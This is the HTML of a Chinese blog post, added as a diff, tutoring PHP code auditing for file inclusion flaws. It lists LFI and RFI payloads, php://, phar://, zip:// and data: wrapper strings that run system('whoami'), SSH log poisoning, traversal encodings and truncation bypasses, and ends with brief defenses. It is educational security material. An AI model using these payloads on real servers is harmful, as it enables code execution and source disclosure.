@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,文件包含," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01前提概要嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。 0x02函数介绍 require：require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），">
+<meta name="keywords" content="php,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代码审计专题(1)">
+<meta property="og:url" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/index.html">
+<meta property="og:site_name" content="l1nk3r&#39;s blog">
+<meta property="og:description" content="0x01前提概要嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。 0x02函数介绍 require：require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/1.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/2.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/3.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/4.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/5.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/7.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/8.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/9.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/10.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/11.png">
+<meta property="og:updated_time" content="2018-05-23T14:20:15.823Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php代码审计专题(1)">
+<meta name="twitter:description" content="0x01前提概要嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。 0x02函数介绍 require：require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），">
+<meta name="twitter:image" content="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/"/>
+
+
+
+
+
+  <title>php代码审计专题(1) | l1nk3r's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l1nk3r's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/Friends" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/05/23/php代码审计专题-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="l1nk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1nk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php代码审计专题(1)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-23T21:46:45+08:00">
+                2018-05-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+            
+              &nbsp; | &nbsp;
+              <span id="/2018/05/23/php代码审计专题-1/"class="leancloud_visitors" data-flag-title="php代码审计专题(1)">
+              &nbsp;热度
+              </span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/23/php代码审计专题-1/" class="leancloud_visitors" data-flag-title="php代码审计专题(1)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01前提概要"><a href="#0x01前提概要" class="headerlink" title="0x01前提概要"></a>0x01前提概要</h1><p>嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。</p>
+<h1 id="0x02函数介绍"><a href="#0x02函数介绍" class="headerlink" title="0x02函数介绍"></a>0x02函数介绍</h1><ul>
+<li><a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a>：<code>require</code> 和 <code>include</code> 几乎完全一样，除了处理失败的方式不同之外。<strong>require</strong> 在出错时产生 <strong>E_COMPILE_ERROR</strong> 级别的错误。换句话说将导致脚本中止而 <a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 只产生警告（<strong>E_WARNING</strong>），脚本会继续运行。</li>
+<li><a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a>：包含并运行指定文件。</li>
+<li><a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.require-once.php" target="_blank" rel="noopener">require_once</a>:和 <a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a> 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。参见 <a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.include-once.php" target="_blank" rel="noopener">include_once</a> 的文档来理解 <code>_once</code> 的含义，并理解与没有 <code>_once</code> 时候有什么不同。</li>
+<li><a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.include-once.php" target="_blank" rel="noopener">include_once</a>:在脚本执行期间包含并运行指定文件。此行为和 <a href="https://link.jianshu.com?t=http://php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。<code>include_once</code> 可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。</li>
+</ul>
+<p>PHP下会出现文件包含漏洞的情况基本上就是在这4个函数里面。</p>
+<h1 id="0x02漏洞场景"><a href="#0x02漏洞场景" class="headerlink" title="0x02漏洞场景"></a>0x02漏洞场景</h1><ol>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
+</ol>
+<h2 id="1-LFI-Local-File-Inclusion"><a href="#1-LFI-Local-File-Inclusion" class="headerlink" title="1. LFI(Local File Inclusion)"></a>1. LFI(Local File Inclusion)</h2><p>本地文件包含，顾名思义就是只能打开，并且包含本地文件的漏洞。大部分情况下，我们遇到的漏洞都是LFI。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> ($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/05/23/php代码审计专题-1/1.png" alt="img"></p>
+<h2 id="2-RFI-Remote-File-Inclusion"><a href="#2-RFI-Remote-File-Inclusion" class="headerlink" title="2. RFI(Remote File Inclusion)"></a>2. RFI(Remote File Inclusion)</h2><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但是RFI的条件比LFI的条件苛刻点需要在PHP.ini中作出如下配置：</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。</p>
+<p><img src="/2018/05/23/php代码审计专题-1/2.png" alt="img"></p>
+<h2 id="3-包含姿势总结"><a href="#3-包含姿势总结" class="headerlink" title="3. 包含姿势总结"></a>3. 包含姿势总结</h2><h3 id="3-1-php伪协议"><a href="#3-1-php伪协议" class="headerlink" title="3.1 php伪协议"></a>3.1 php伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p><img src="/2018/05/23/php代码审计专题-1/3.png" alt="img"></p>
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>利用条件：没有前置条件</p>
+<p>姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/05/23/php代码审计专题-1/4.png" alt="img"></p>
+<p><img src="/2018/05/23/php代码审计专题-1/5.png" alt="img"></p>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。其他姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：</p>
+<p>假设有个文件index.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<img src="/2018/05/23/php代码审计专题-1/7.png" alt="img"></p>
+<p>指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://Applications/MxSrvs/www/index.txt.zip/index.txt</span><br></pre></td></tr></table></figure>
+<p>使用相对路径（这里index.txt.zip就在当前目录下）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://index.txt.zip/index.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/05/23/php代码审计专题-1/8.png" alt="img"></p>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://Users/l1nk3r/Desktop/phpinfo.txt.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>若是使用相对路径，则会包含失败。</p>
+<h4 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h4><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/05/23/php代码审计专题-1/9.png" alt="img"></p>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>姿势二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
+<p><img src="/2018/05/23/php代码审计专题-1/10.png" alt="img"></p>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<h3 id="3-2-包含sessions"><a href="#3-2-包含sessions" class="headerlink" title="3.2 包含sessions"></a>3.2 包含sessions</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<img src="/2018/05/23/php代码审计专题-1/11.png" alt="img"></p>
+<p>常见的php-session存放位置：</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ol>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<h3 id="3-3-包含日志"><a href="#3-3-包含日志" class="headerlink" title="3.3 包含日志"></a>3.3 包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>姿势：</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>但如果是直接发起请求，像firefox这种东西自动url编码，然后就会写入到log里，就很气，所以通过burp拦截修改下就好了。</p>
+<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：</p>
+<p>用ssh连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</span><br></pre></td></tr></table></figure>
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码。</p>
+<h3 id="3-4包含上传文件"><a href="#3-4包含上传文件" class="headerlink" title="3.4包含上传文件"></a>3.4包含上传文件</h3><p>利用条件：千变万化，不过最少你得知道要包含的文件叫啥，在哪吧。</p>
+<p>姿势：</p>
+<p>经常配合没办法直接上传动态脚本时候，可以上传一些奇怪的图片等允许文件。</p>
+<h1 id="0x03绕过姿势"><a href="#0x03绕过姿势" class="headerlink" title="0x03绕过姿势"></a>0x03绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样就很“难”直接去包含前面提到的种种文件。</p>
+<h2 id="1-指定前缀"><a href="#1-指定前缀" class="headerlink" title="1. 指定前缀"></a>1. 指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
+<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=../../log/test.txt</span><br></pre></td></tr></table></figure>
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
+<h2 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2. 编码绕过"></a>2. 编码绕过</h2><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。</p>
+<ul>
+<li>利用url编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器/服务器的编码方式<ul>
+<li>../<ul>
+<li>..%c0%af</li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-指定后缀"><a href="#3-指定后缀" class="headerlink" title="3. 指定后缀"></a>3. 指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="远程文件包含的利用"><a href="#远程文件包含的利用" class="headerlink" title="远程文件包含的利用"></a>远程文件包含的利用</h3><p>url格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
+<p>姿势一：query（？）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code>问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。</p>
+<p>姿势二：fragment（#）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code>问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。</p>
+<p>利用协议前面有提到过利用zip协议和phar协议。假设现在测试代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造压缩包如下：<br>其中test.php内容为：<br>&lt;?php phpinfo(); ?&gt;</p>
+<p>利用zip协议，注意要指定绝对路径</p>
+<p>则拼接后为：zip:///var/WWW/test.zip#test/test/test.php<br>能成功包含。</p>
+<h2 id="4-长度截断"><a href="#4-长度截断" class="headerlink" title="4. 长度截断"></a>4. 长度截断</h2><p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=././././。。。省略。。。././shell.txt</span><br></pre></td></tr></table></figure>
+<p>则后缀/test/test.php，在达到最大值后会被直接丢弃掉。</p>
+<h2 id="5-00字节截断"><a href="#5-00字节截断" class="headerlink" title="5. %00字节截断"></a>5. %00字节截断</h2><p>利用条件： php版本 &lt; php 5.3.4，且不开启gpc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>
+<p>能利用00截断的场景现在应该很少了：）</p>
+<h1 id="0x04-防御方案"><a href="#0x04-防御方案" class="headerlink" title="0x04 防御方案"></a>0x04 防御方案</h1><p>1.可以在php.ini中配置了open_basedir，来缓解。</p>
+<p>2.对于<code>../</code>以及<code>..\</code>进行过滤。</p>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://xz.aliyun.com/t/29" target="_blank" rel="noopener">PHP文件包含漏洞</a></p>
+<p><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="noopener">Local File Inclusion</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/15/从web-for-pentest看php代码审计/" rel="next" title="从web-for-pentest看php代码审计">
+                <i class="fa fa-chevron-left"></i> 从web-for-pentest看php代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/24/记一次恶意安卓app分析/" rel="prev" title="记一次恶意安卓app分析">
+                记一次恶意安卓app分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
